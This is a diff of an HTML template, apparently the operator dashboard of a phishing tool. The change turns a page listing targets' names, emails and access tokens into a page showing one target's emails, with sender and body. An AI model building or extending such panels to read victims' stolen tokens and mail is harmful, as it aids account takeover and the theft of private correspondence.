@@ -8,7 +8,7 @@
         <meta name="description" content="">
         <meta name="author" content="">
 
-        <title>User Viewer</title>
+        <title>Email Viewer</title>
 
         <!-- Bootstrap core CSS -->
         <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
@@ -17,22 +17,20 @@
     <body>
 		<div class="container">
 			<div id="phish-title">
-				<h1><b>Select A Targets Emails To View</b></h1>
+				<h1><b>Emails For {{username}}</b></h1>
 			</div>
 			<table class="table">
 				<thead>
 					<tr>
-						<th scope="col">Name</th>
-						<th scope="col">Email</th>
-						<th scope="col">Token</th>
+						<th scope="col">Sender</th>
+						<th scope="col">Body</th>
 					</tr>
 				</thead>
 				<tbody>
-				{% for user in users %}
+				{% for email in emails %}
 					<tr>
-						<th scope="row"><a href="/email_viewer?user={{user.id}}">{{user.name}}</th>
-						<td>{{user.email}}</td>
-						<td>{{user.token}}</td>
+						<th scope="row">{{email.sender_email}}</th>
+						<td>{{email.body}}</td>
 					</tr>
 				{% endfor %}
 				</tbody>
